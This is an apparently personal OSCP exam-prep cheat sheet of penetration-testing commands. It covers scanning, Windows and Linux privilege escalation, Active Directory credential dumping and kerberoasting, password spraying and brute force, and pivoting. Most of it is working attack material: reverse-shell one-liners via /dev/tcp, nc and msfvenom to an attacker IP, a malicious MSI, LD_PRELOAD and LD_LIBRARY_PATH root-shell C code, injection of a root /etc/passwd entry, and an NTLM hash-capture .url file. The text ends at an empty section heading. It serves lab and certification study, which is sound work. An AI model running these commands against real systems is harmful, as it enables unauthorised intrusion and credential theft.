# OSCP Commands Cheat Sheet

Passed the 2023 version of the OSCP, these commands were gathered throughout practicing for the exam.

- [OSCP Commands Cheat Sheet](#oscp-commands-cheat-sheet)
  * [Nmap Scans and Inital Enumeration](#nmap-scans-and-inital-enumeration)
    + [Regular scans to do on every system:](#regular-scans-to-do-on-every-system)
    + [**Enum4linux**](#enum4linux)
    + [LDAP](#ldap)
    + [Scanning through a Pivot](#scanning-through-a-pivot)
    + [Scanning for Vulnerabilities](#scanning-for-vulnerabilities)
- [Windows Commands Reminders and Priv esc](#windows-commands-reminders-and-priv-esc)
    + [Usefull commands and Enumeration:](#usefull-commands-and-enumeration)
  * [Initial access reminders](#initial-access-reminders)
    + [**Connecting to box with creds**](#connecting-to-box-with-creds)
    + [Switch to user with creds and NO GUI](#switch-to-user-with-creds-and-no-gui)
    + [Enumerating Service on windows box](#enumerating-service-on-windows-box)
  * [Windows Priv Esc](#windows-priv-esc)
    + [Great lil cheat sheet](#great-lil-cheat-sheet)
- [Active Directory Magic](#active-directory-magic)
- [SMB](#smb-3)
- [Setting up Pivot](#setting-up-pivot)
    + [SSH](#ssh-1)
    + [Chisel HTTP Tunnel](#chisel-http-tunnel)
- [Linux Cheat Sheet](#linux-cheat-sheet)
  * [Low Hanging Fruit](#low-hanging-fruit)
  * [Checklist](#checklist-1)
- [SNMP](#snmp-1)
- [Passowrd attacks](#passowrd-attacks)
    + [Password attacks](#password-attacks)
    + [Spraying against winrm](#spraying-against-winrm)
    + [Craking zip:](#craking-zip)
    + [Cracking SYSTEM and ntds.dit](#cracking-system-and-ntdsdit)
    + [Cracking SAM and SYSTEM](#cracking-sam-and-system)
    + [Cracking keepass (.kdbx)](#cracking-keepass-kdbx)
    + [**Cracking Hash snagged from SMB auth)**](#cracking-hash-snagged-from-smb-auth)
- [Web Attack Guide](#web-attack-guide)



## Nmap Scans and Inital Enumeration

### Regular scans to do on every system:

`sudo nmap -sC -sV -T4 -Pn -oN nmapscan1.txt $ip` 

`sudo nmap -A -T4 -Pn -oN nmapscan2.txt $ip` 

`sudo nmap -p- -Pn -T5 -oN portscan.txt $ip` 

**UDP scan**

`sudo nmap -sU -sV -oN udpscan.txt --version-intensity 0 -F -n $ip`

if SNMP is open try SNMP walk


### **Enum4linux**

`enum4linux <IP>`

### LDAP

`nmap -sV --script “ldap* and not brute” <IP>`

### Scanning through a Pivot

`sudo proxychains nmap -vvv -sT --top-ports=60 -Pn -n $ip`

Scanning for win-rm and mssql

`proxychains nmap -vvv -sT -p 5985,5986,1433 -Pn -n $ip`

If its real down bad and slow

`proxychains nmap -sT 21,22,23,25,53,80,88,135,161,389,445,8000,8080,3389,5985,3306,3307,1433,5432 -iL <Filename>.txt <IP>`****

### Scanning for Vulnerabilities

smb scan:

`nmap -T5 -sV --script 'smb-vuln*' <IP>`

Very rare but just a common vuln scan:

`nmap -T5 -sU --top-ports 10000 <IP>`

# Windows Commands Reminders and Priv esc

msfvenom quick shell:  

`msfvenom -p windows/shell/reverse_tcp LHOST=<hostIP> LPORT=<port> -f exe -o revshell.exe` 

### Usefull commands and Enumeration:

CMD

`whoami /groups`

`netstat -ano`

To list all active network connections we can use netstat11 with the argument -a to display all active TCP connections as well as TCP and UDP ports, -n to disable name resolution, and -o to show the process ID for each connection (Powershell)

`Get-LocalUser`

`Get-LocalGroup` or `Get-LocalGroupMember <group-name>`

`route print`

All 32 bit applications (Powershell):

`Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

All 64 bit applications (Powershell):

`Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

Files belonging to users (Powershell):

`Get-ChildItem -Path C:\Users\<username>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`

Currently running processes (Powershell):

`Get-Process`

History of powershell of user and path (Powershell):

`(Get-PSReadlineOption).HistorySavePath`

Restart a service (Powershell): 

`Restart-Service -Name "<ServiceName>”`

Add color to windows GUI cmd for winpeas 

`reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1`

---

## Initial access reminders

**Check out LDAP scan always**

`enum4linux <IP>`

**LDAP SHIT and ldapsearch**

nmap enum info from ldap such as usernames and passwords

`nmap -sV --script “ldap* and not brute” <IP>`

can find usernames and possibly hints about where to go next with descripion of each account you get

`ldapsearch -x -b "DC=<dn>,DC=<dn>" "*" -H ldap://<IP> > <filename>.txt`

grep for `sAMAccountName` and `descriptions` 

**Responder**

If i can upload and download or delete anything in a SMBSHARE try running responder and doing so and see if hash of null session is recieved

`responder -I tun0 -v`

if hash is not grabbed from responder but we have write perms try making a .icon file

First make `.url` file

`touch <filename>.url` && `nano <filename>.url`

make the file like soo

```python
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\<IpOfResponsder>\%USERNAME%.icon
IconIndex=1
```

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/d8c82d06-5a91-4c61-9176-b1a345af52c8)

IP can be found in repsonder output, Example below on responder while running

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/f23d133f-8da0-436b-9920-c813cb05f491)

connect to SMB share and upload `.url` file

`put <filename>.url`

snag all the hashes and crack with `hashcat` or basic `John` command

`john <HashFile> /usr/share/wordlist/rockyou.txt` 

**Cadaver**

if WebDav is enabled on Web Server and have creds, can use `cadaver` to upload rev shell

scan to see if WebDav is enabled 

`nmap --script http-webdav-scan -p <WebServicePort> <IP>`

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/089e33e2-27c0-4473-aff7-ae72d618bac9)

Run Cadaver

`cadaver http://http://192.168.228.122/<IP>`

upload webshell (If IIS service upload aspx rev shell from the `/usr/share/webshells/aspx/cmdasp.aspx` directyory)

`put <Path-to-Webshell>`

Navigate to webshell in Web Browser and should be all good

---

### **Connecting to box with creds**

ssh with ssh key

`ssh -i <id_rsaKeyName> <IP>`

PsExec

`impacket-psexec <domain>/<username>:<password>@<IP>`

WinRM

`evil-winrm -i 10.10.135.154 -u Administrator -p hghgib6vHT3bVWf`

MSSQL

`impacket-mssqlclient -p 1433 <Username>[@](mailto:sql_svc@10.10.88.148)<IP> -windows-auth`

### Switch to user with creds and NO GUI

`runas /user:<username> cmd`


---

### Enumerating Service on windows box

Query Config of sevice

`sc.exe qc <name>`

Query current status of service

`sc.exe query <name>`

Modify config of service 

`sc.exe config <name> <option>= <value>`

Start/Stop service

`net start <name>`

`net stop <name>`

Get owner and access controls on service/script/file in powershell:

`Get-ACL <filename/path> | fl`

---

## Windows Priv Esc

**ALWAYS CHECK TokenZ**

`whoami /priv`

Use `PrintSpoofer` or `GodPotato` if `SeImpersonatePrivilege`

(https://github.com/BeichenDream/GodPotato/releases/tag/V1.20)

**Cached Credentials**

`cmdkey /list`

**Binary Hijacking and DLL hijacking**

`Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`

**Unquoted Service Path’s**

`wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v ""”`

**Scheduled tasks**

`schtasks /query /fo LIST /v`

`schtasks /query /v /fo LIST | findstr /i "<username>*”`

`Get-ScheduledTask`

**Check AlwaysInstallElevated Registry**

`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` if returns with `0x1` make an MSI, it'll run as SYSTEM OR winpeas output

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/fdedcc3f-9a15-4ea1-b493-a7ea31353932)

- then on kali

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_ip LPORT=LOCAL_PORT -f msi -o malicious.msi`

- finally on target

`msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`

********Check installed applications********

- Run winpeas process-info and searchsploit interesting applications

`.\winPEASx64.exe quiet processinfo`

- or 

`.\seatbelt.exe NonstandardProcesses`

**Check for Windows backup files in C:\ directory**

**Check powershell history files**

`(Get-PSReadlineOption).HistorySavePath`

- Check it out manually by going to this path 

`C:\Users\<UserName>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine`

**Check for database files**

`Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`

**Check for useful files in User's directory**

`Get-ChildItem -Path C:\Users\<Filename>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,.log,.kdbx,.xml -File -Recurse -ErrorAction SilentlyContinue`

`Get-ChildItem -Path C:\Users\<Username> -Include *.txt -File -Recurse -ErrorAction SilentlyContinue`

`.log` `.kdbx` `.xml` literally any weird files in user's directory

**Check for XAMP path for databases:**

`Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`

**Check env variables for passwords and such**

- outputs env variables:

`set`

**Finally run Winpeas + check for Vulnerable installed software and POWERUP**

**Weak Registry Perms from winPEAS**

- in winPEAS look for this vuln (next to list of vulnerable services)

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/47799c17-8d8a-4530-bf41-772c727aada5)

- Next open a powershell prompt and check permissions on groups, see if current user is in group

`Get-Acl <Registry_Path> | Format-List`

- If user is in group with RW, Full or Management cntrls, check if user can restart service in any way

checking for auto-start on restart
`Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<service_name>'}`

- or just `net stop` or `net start` and see if you can

- Next run `sc qc <service_name>` and look for “BINARY_PATH_NAME”

`sc qc <service_name>`

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/39ebbe57-b8f0-4423-af23-794cdc71893c)

- Finally, change binpath to reverse shell transferred onto the device

`sc config <name> binpath= "\"C:\Windows\Temp\<reverse_shell>"”`

**Check installed packages**

`Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

`Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

**Always Check for symlinks exploit**

**SharpGPOabuse (For AD environments/machines)**

- If we have “all” access to edit GPO’s (we can check with powerview) we can used SharpGPOabuse to escalate pirvs

- To start `transfer PowerView.ps1 to the target system` and `run "powershell" in shell on target`

- Next start `PowerView.ps1`

`.\PowerView.ps1` 

- In PowerView run and copy the “`Id`”

`Get-GPO -Name “Default Domain Policy”`

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/284ce537-e6e9-4032-baad-02ce350eefa6)

- With the Id and in `PowerView.ps1` run this command

`Get-GPPermission -Guid <Id> -TargetType User -TargetName <CurruentUsername>`

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/f3e4bec8-ee58-46ee-a5b6-fbb114082715)

- If permissions are set as the same above (`GpoEditDeleteModiySecuirty`) Transfer Sharp (Download .exe here: https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master)

then run `ShapGPOAbuse.exe`

`.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <username> --GPOName "Default Domain Policy"`

- then update the GPO

`gpupdate /force`

- check if user is admin

`net user <username>`

DONE!@#$

### Great lil cheat sheet

https://github.com/isch1zo/Windows-PrivEsc-cheatsheat

---


# Active Directory Magic

## Checklist

### 00. Scanning

`proxychains nmap -sT 21,22,23,25,53,80,88,135,161,389,445,8000,8080,3389,5985,3306,3307,1433,5432 -iL int_hosts.txt`

### 01. Getting Users and Groups

- What users belong to groups that allow remote management? (RDP, winRM)

### On Windows (Depends on Domain Policies)

### Net

- `net user /domain` all users in domain
- `net user username /domain` information on a domain user
- `net group /domain`
- `net group groupname /domain`
- `nltest /dclist:<domain>` find domain controller (not for OSCP)

### PowerView

[Cheatsheet](https://zflemingg1.gitbook.io/undergrad-tutorials/powerview/powerview-cheatsheet) **Test for SID you control with *genericall* on another user/group**

(Great Guide https://cybergladius.com/htb-walkthrough-support/)

- `Get-ObjectAcl -Identity "<UsernameOrGRoup>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights`
- `"S-1-5-21-890171859-3433809279-3366196753-1107", "S-1-5-21-890171859-3433809279-3366196753-1108", "S-1-5-32-562" | ConvertFrom-SID`
    - `net user username newpassword /domain`

**Kerberoastable Users**

- `Get-NetUser -Domain msp.local | Where-Object {$_.servicePrincipalName} | select name, samaccountname, serviceprincipalname`

**Computers in the domain**

- `Get-NetComputer -Properties samaccountname, samaccounttype, operatingsystem`

**List groups**

- `Get-NetGroup -Domain internal.msp.local | select name`

**Members of a group**

- `Get-DomainGroupMember "Domain Admins" -Recurse`

**Current User Info**

Searches environment for other machines user has access to log into

- `Find-LocalAdminAccess`

Find shares on Network

- `Find-DomainShare`

### On Kali

### SMB

### Creds:

- `cme smb 192.168.215.104 -u 'user' -p 'PASS' -d 'oscp.exam' --users`
- `crackmapexec smb <IP> -u 'user' -p 'PASS' --rid-brute`
- `crackmapexec smb <IP> -u 'user' -p 'PASS' -d 'oscp.exam' --groups`
- `crackmapexec smb <IP> -u 'user' -p 'PASS' --local-users`
- `crackmapexec smb <IP> -u 'Administrator' -p 'PASS' --local-auth --sam`

### LDAP

### Creds:

`ldapsearch -x -H ldap://<IP> -D 'medtech\wario' -w 'Mushroom!' -b 'DC=MEDTECH,DC=COM'`

### RPC

### No Creds:

`rpcclient -U "" -N <IP>`

### Creds:

`rpcclient -U "medtech.com/wario%Mushroom!" <IP>`

---

### 02. Searching for Passwords

### On Windows

### Mimikatz [cheatsheet](https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49)

**Requires admin permissions**

- `privilege::debug` `token::elevate`
- `sekurlsa::logonpasswords`
    - `ekeys` `credman` `wdigest`
- `lsadump::sam`
    - `secrets`
- `.\mimikatz.exe "token::elevate" "lsadump::secrets" exit`

### Rubeus

**Requires admin permissions** **Kerberoasting**

- `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`
- `sudo hashcat -m 13100 hashes.kerb /usr/share/wordlists/rockyou.txt --force`
- **AS-REP Roasting**
- `.\Rubeus.exe asreproast /nowrap`
- `sudo hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt --force`
- `sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

### Cached Credentials

**Database Files**

- `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
- `keepass2john Database.kdbx > Keepasshash.txt`
- `john --wordlist=/usr/share/wordlists/rockyou.txt Keepasshash.txt`
- Move the database to `~/keepass` and interact with `kpcli`
- 

**PowerShell history**

- `Get-History`
- `(Get-PSReadlineOption).HistorySavePath`
- `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` (Run for each user)

**Interesting Files**

- `cmdkey /list`
- In Users directories `Get-ChildItem -Path C:\Users\ -Include *.txt,*.log,*.xml,*.ini -File -Recurse -ErrorAction SilentlyContinue`
- On Filesystem `Get-ChildItem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
- `sysprep.*` `unattend.*`
- `Group Policies` `gpp-decrypt <hash>`

### On Kali

### LDAP

- `ldapsearch -x -H ldap://<IP> -D 'medtech\wario' -w 'Mushroom!' -b 'DC=MEDTECH,DC=COM'`
- `ldapsearch -x -H ldap://<IP> -D 'wario' -w 'Mushroom!' -b 'DC=MEDTECH,DC=COM'`

### SMB

- `crackmapexec smb <IP> -u 'user' -p 'PASS' -d 'oscp.exam' --shares`
- `crackmapexec smb <IP> -u 'user' -p 'PASS' --local-auth --shares`
- `crackmapexec smb <IP> -u 'user' -p 'PASS' --sessions`
- `crackmapexec smb <IP> -u 'user' -p 'PASS' --lusers`

### SNMP

- `sudo nmap -sU -p 161 --script snmp-brute <IP>`
- `sudo nmap -sU -p 161 --script snmp-win32-users <IP>`
- `onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <IP>`
- `snmpwalk -v 1 -c public 192.168.194.149 NET-SNMP-EXTEND-MIB::nsExtendObjects`
- `snmpwalk -v2c -c public 192.168.194.149 | grep <string>`
    - STRING
    - USER
    - PASSWORD
    - hrSWRunParameters
    - i "login|fail"
    - `E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b"`

### Impacket

### Kerberos

`impacket-GetUserSPNs corp.com/meg:'VimForPowerShell123!' -dc-ip <IP> -outputfile hashes.kerb`

### AS-REP Roast

`impacket-GetNPUsers corp.com/meg:'VimForPowerShell123!' -dc-ip <IP> -outputfile dave.hash`

---

### 03. Compile

- Make a list of users
    - make sure to differentiate `local` and `domain` users!
- Make a list of hashes and passwords or anything you think might be a password
    - `domain_hashes.txt`
    - `domain_passwords.txt`
- Check the `password policy` to make sure you're not locking yourself out
    - **On Windows:**`net accounts /domain`
    - **On Kali:** `cme smb 172.16.10.10 --pass-pol` (Might need valid creds)

---

### 04. SPRAY EVERYTHING

- specify with and without domain
- [[[Pass the Hash]]](https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/)

### Kerberos

**Password Spray** `proxychains -q /home/kali/go/bin/kerbrute passwordspray -d oscp.exam users.txt hghgib6vHT3bVWf --dc <IP> -vvv` 

**Bruteforce** `proxychains -q /home/kali/go/bin/kerbrute bruteuser -d oscp.exam jeffadmin passwords.txt --dc <IP> -vvv`

### SMB

`proxychains -q /home/kali/.local/bin/cme smb <IP> -u users.txt -p passwords.txt -d medtech.com --continue-on-success`

`proxychains -q /home/kali/.local/bin/cme smb <IP> -u users.txt -p passwords.txt --continue-on-success`

`cme smb <IP> -u users.txt -H '<HASH>' --continue-on-success`

`cme smb <IP> -u users.txt -p passwords.txt --continue-on-success --local-auth`

### RDP

`hydra -V -f -l offsec -P /usr/share/wordlists/rockyou.txt rdp://<IP>:3389 -u -vV -T 40 -I`

`hydra -V -f -L users.txt -P passwords.txt rdp://<IP> -u -vV -T 40 -I`

### WinRM

`evil-winrm -i <IP> -u jeffadmin -p 'password'`

`evil-winrm -i <IP> -u jeffadmin -H 'HASH'`

### FTP

`hydra -V -f -l offsec -P /usr/share/wordlists/rockyou.txt ftp://<IP>:21 -u -vV -T 40 -I`

### SSH

`hydra -V -f -l offsec -P /usr/share/wordlists/rockyou.txt ssh://<IP>:22 -u -vV -T 40 -I`

## SMB Server (Windows)

If you can't move file from Kali to the internal network, you can create a new share on DMZ.

- Need Administrator+ on **M1**
- Make sure to transfer the files into C:\temp you want to host

**On M1:** `mkdir C:\temp`

`New-SmbSHare -Name 'temp' -Path 'C:\temp' -FullAccess everyone`

**On M2:** `net use \\<IP>\temp`

`copy \\10.10.10.20\temp\nc.exe C:\nc.exe`

# SMB

**Start SMB share**

`sudo impacket-smbserver -smb2support test MS01`


**Nmap scan for vulns**

`sudo n*map -T5 -sV --script 'smb-vuln*' <IP>`

**List shares:**

`smbclient -L \\<IP>\ -N`

`crackmapexec smb <IP> -u '' “ -p '' “ --shares`

`smbmap -H <IP> -R`

`smbmap -H <IP> -u df`

**connect with no creds:**

`smbclient //<IP>/<sharename> -U ""%""`

`smbclient //<IP>/<sharename> -N`

**RPC** 

- if no password required SMB/try in general:

`rpcclient -U  '' -N <IP>`

- then run this to list users

`enumdomusers`

- or groups

`enumdomgroups`

- and query # user in groups:

`querygroup <rid #>`

# Setting up Pivot

### SSH

make sure SSH is enabled on kali

`systemctl status ssh`

start ssh if not enabled

`systemctl start ssh`

Next, on target device we have aceess to, set up dynamic pivot into network. AKA, SSH into our local kali box with these creds:

`ssh -N -R 9998 <username>@<IP>`

Check status of pivot w/ 

`ss -anp`

Make sure Proxychains is configured with the correct port

### Chisel HTTP Tunnel

- (https://github.com/jpillora/chisel)

`Transfer chisel to client`

then on our Kali machine start the chisel server

`chisel server --port 8080 --reverse`

and on the target (our example with be from a windows device)

`.\chisel.exe client <IP>:8080 R:socks`

should receive connection on and have pivot on port 1080

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/7e72cd76-967d-4990-b9f2-af1635d89cd8)

Add port 1080 to `/etc/proxychains4.conf` and continue to enumerate the rest of the network:

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/264adc93-353e-4cff-b6dd-0f0391a3ae0d)

# Linux Cheat Sheet

********Quick Reverse Shell********

/bin/bash -i >& /dev/tcp/<IP>/<Port> 0>&1

`msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f elf -o reverse.elf`

**Easy cat rev shell one liner into .sh files:** 

`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc **<IP>** **<Port>** >/tmp/f" >> **<Filename>.sh`

**Some nc rev shell examples**

If you have command execution but the shells your making is dont work nc will almost always work, I have not done a CTF or box provided by offsec where nc was not usable. The syntax of the command can be different from box to box, the examples listed below work in any box I did to prepare for the exam

`ncat -e /bin/bash <IP> <Port>`

`nc -e /bin/bash`

`nc <IP> <Port> -e cmd`

**THE GOAT, pwnkit**

https://github.com/joeammond/CVE-2021-4034

## Low Hanging Fruit

**User with valid credentials (sudo -l):**

- `sudo -l` to see what binaries you can run with `sudo`, head over to [GTFOBins](https://gtfobins.github.io/)
- `sudo -V` to get version, below 1.28 can use `sudo -u#-1 /bin/bash`

**SUID Binaries**

- `find / -perm -u=s -type f 2>/dev/null`
- `find / -perm -4000 2>/dev/null`
- Head over to [GTFOBins](https://gtfobins.github.io/)

**Kernel Exploits:**

- `uname -a` && `searchsploit`
- [Compiled Kernel Exploits](https://github.com/lucyoa/kernel-exploits)
- `~/exploits` and Privilege Escalation notes

**Writable /etc/passwd**

- `ls -la /etc/passwd` to see if you have write permissions
- `openssl passwd -1 -salt hacker hacker` and replace `root` password entry (or delete `x`)
- `su root` `hacker`

## Checklist

- **Upgrade your shell** if it's not fully interactive
    - `python -c 'import pty;pty.spawn("/bin/bash")'`
    - `python -c 'import pty;pty.spawn("/bin/sh")'`
    - `python3 -c 'import pty;pty.spawn("/bin/bash")'`
    - `python3 -c 'import pty;pty.spawn("/bin/sh")'`
- **Get system context current user, hostname, groups**
    - `whoami` `id` `hostname`
- **Check for sudo (valid password) and LD_PRELOAD and LD_LIBRARY_PATH (examples below)**
    - `sudo -l` `sudo -V` (below 1.28 `sudo -u#-1 /bin/bash`)
- **Check for SUID Binaries**
    - `find / -perm -u=s -type f 2>/dev/null`
    - `find / -perm -4000 2>/dev/null`
- **Check groups**
    - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe

- **Check for users && writable /etc/passwd**
    - `ls -la /etc/passwd` `cat /etc/passwd` `ls -l /etc/shadow`
        - EX /etc/passwd:
        
        ```
        joe@debian-privesc:~$ openssl passwd w00t
        Fdzt.eqJQ4s0g
        
        joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
        ```
        
        - EX /etc/shadow:
            - check what type of hash the /etc/shadow file is using, for example a password hash starting with ******$6$****** is sha-512. Generate new passwd based of hashing algorithm being utilized
                - `mkpasswd -m sha-512 password`
                - sha-512 hash example in /etc/shadow
                
                ![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/fe645ed8-aadf-4184-bd84-729376c3ef9b)
                
            
            ![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/28b067cb-8b9e-4c21-90ec-6405dbe0f5e1)
            
            - Finally replace password in /etc/shadow of root user
                
                ![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/ff8b781f-6238-4c2e-90cb-da61637bf643)
 

- **Check environment**
    - `echo $PATH` `(env || set) 2>/dev/null` `history` `cat ~/.bashrc`
- **Check processes**
    - `ps aux` `ps aux | grep ‘^root’` `ps -ef` `watch -n 1 "ps -aux | grep pass"` `sudo tcpdump -i lo -A | grep "pass”`

searchsploit suspicious processes ran by root especially

- **Check cronjobs**
    - `ls -lah /etc/cron*` `cat /var/log/syslog | grep cron` `cat /var/log/cron.log`
    - `grep "CRON" /var/log/syslog` `ls -la /etc/cron.d` `ls -la /etc/cron.hourly`
    - **CHECK FOR CRONTABS**  `cat /etc/crontab`
- Easy Cat rev shell one liner into .sh files:

`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc **<IP>** **<Port>** >/tmp/f" >> **<Filename>.sh**`

**Abusing Capabilities:**

Get capabilites of all files:

`/usr/sbin/getcap -r / 2>/dev/null`

Lopp for cap_setuid+ep

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/49613c76-e965-4b96-a43a-0dbcd8031e38)

Search gtfobins and check for priv esc with said ca

https://gtfobins.github.io/#+capabilities

Do research and find priv esc

- **Check networking & services running on localhost**
    - `ip a` `netstat` `ss -anp`
- **Check your writable/usable files & file permissions**
    - `find / -writable -type d 2>/dev/null`
    - `find / -perm -u=s -type f 2>/dev/null`
    - `ls -la`
- **Get kernel version && check for vulnerability**
    - `uname -a` && `searchsploit`
- Check for creds in, .db, .xml and .conf files from **`/var/www/html`**

### LINPEAS AND `unix-privesc-check` and Linux Smart Enumeration (lse.sh)

**CHECK THESE AS WELL**

CVE-2021-3156

DirtyPipe

[CVE-2021-4034.py](http://cve-2021-4034.py/)

### LD_PRELOAD and LD_LIBRARY_PATH examples

**LD_PRELOAD**

if running `sudo -l` and see LD_PRELOAD and have sudo perms on binary you can priv esc

`sudo -l`

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/b5aa322a-3b36-4834-84e7-480bdf932eb8)

Next make shared object (.so) file like so with c 

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/29dd79eb-f378-4d56-a67b-f7f62d8ae7f2)


```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

Next compile the .c expoit to create shared object (.so file)

`gcc -fPIC -shared -nostartfiles -o /tmp/<filename>.so <filename>.c` 

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/a6e5e005-ca7c-4a92-8dfb-37d38c0d1729)


Finally run binary with sudo and LD_preload shared object we just created

`sudo LD_PRELOAD=/tmp/<filename>.so <binary>`

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/a15d4984-c762-4954-88ec-5d61877db895)

_

**LD_LIBRARY_PATH**

if running `sudo -l` and seeLD_LIBRARY_PATH and have sudo perms on binary you can priv esc

`sudo -l`

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/dfa2bf4c-5028-41dc-9512-fd01b5cfaae6)

look for shared object to replace w/ `ldd` command on whatever binary

`ldd <path_to_binary>`

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/ea46d3ea-c4db-40b4-a9bb-86c0718d7699)

take note of the name of the shared object we want to replace

Next, make shared object like so with .c

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/a6760026-a993-4a6a-9520-936d67ff6046)

Next, complie the file and change the name of the file to the shared object we want to replace

`gcc -o <ldd_sharedobject_to_replace> -shared -fPIC <filename>.c`

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/1ede207c-76d1-4c83-a880-953943fc2943)

Finally, run binary with sudo perms and specifiy shared object

`sudo LD_LIBRARY_PATH=. <binary>`

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/5e590910-05b1-47d1-9be4-ac1e17ab5a1e)

# SNMP

HackTricks Page

(https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp)

CTF’s involving SNMP walk

(https://steflan-security.com/hack-the-box-pit-walkthrough/](https://steflan-security.com/hack-the-box-pit-walkthrough/) and https://resources.infosecinstitute.com/topic/snmp-pentesting/)

**Two Ways to go about this first is to download `snmp-mibs-downloader` (this is discussed in the hacktricks article linked above see pic below)**

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/02adf3a6-0669-4dab-8eee-72fcb62eacb9)


`sudo apt-get install snmp-mibs-downloader`

`sudo download-mibs`

then edit the `/etc/snmp/snmp.conf` file and remove the line from the image above

Next, run this command and see if credientals get snagged (Photo example below):

`snmpwalk -v 2c -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull`

if this doesnt work may also be:

`snmpwalk -v 1 -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull`

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/0778a253-d859-4768-88bb-1113f6ae2f36)

Otherwise run this command 

`snmpwalk -v 1 -c public <IP> .1 > <Whatever>.txt`

This will output A LOT OF INFO, `cat`out the text file and `grep` for “STRING” and observe the output. Could give a hint such as a “Password was Reset” or “Password Default” FOR EXAMPLE I receive this output once with FTP also being open on the device

![image](https://github.com/cbass12321/OSCP-Cheat-Sheets/assets/99432278/2f694ace-865a-40e2-b81b-e8f136efe0dc)

If snmp port is open but snmpwalk fails may need to brute force community string. That is shown in the section above of Active Direcrtoy magic. I like this wordlist (https://github.com/danielmiessler/SecLists/blob/master/Discovery/SNMP/common-snmp-community-strings.txt) however that is up to prefrence


# Passowrd attacks

### Password attacks

AWLAYS CHECK https://crackstation.net/

### Spraying against winrm

